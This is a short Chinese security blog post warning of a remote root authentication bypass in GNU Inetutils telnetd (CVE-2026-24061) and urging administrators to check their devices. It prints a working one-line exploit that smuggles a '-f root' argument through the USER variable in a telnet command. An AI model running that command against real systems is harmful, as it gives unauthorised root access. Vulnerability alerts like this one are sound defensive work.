#  大洞，速修！！！Linux Telnetd 远程代码执行！  
原创 ChinaRan404
                    ChinaRan404  知攻善防实验室   2026-01-22 03:10  
  
字少，事大，漏洞介绍：  
  
[【已复现】多款 Linux telnetd服务中招，仅需一个参数即可远程获取 Root 权限，GNU Inetutils telnetd 远程认证绕过漏洞(CVE-2026-24061)](https://mp.weixin.qq.com/s?__biz=Mzk0ODM3NTU5MA==&mid=2247495967&idx=1&sn=ea53cbd5a48e9cf7ca8dd32a4fc59de8&scene=21#wechat_redirect)  
  
  
最新版本已  
  
复现  
  
```
USER='-f root' telnet -a ip
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vrAt81z0j132JIDIIGcMA0d555ByEtvkwnp1hIKcicaYkCibpNXXeDtcaHVWwKIHq78rCt5MwUyic7yQ/640?wx_fmt=png&from=appmsg "")  
  
利用难度：极为简单  
  
利用条件：在漏洞版本，开启 telnetd服务  
  
复现版本：  
  
https://ftp.gnu.org/gnu/inetutils/inetutils-2.7.tar.gz  
```
情报来源：ByAtomsTeam狩猎
POC 来源：https://www.openwall.com/lists/oss-security/2026/01/20/2
```  
  
  
我想说：正常人 Linux 管理都是用 SSH，但是有些设备可能就不是了，火速排查！  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vp2mRdoWm8H5wrntQ3MXIS47Ncog7AVNTw2UY9yiaYsLrkPibOmasHIpZ2ZXKWiboB5tEHsCpo7RwzkA/640?wx_fmt=png&from=appmsg "")  
  
  
  
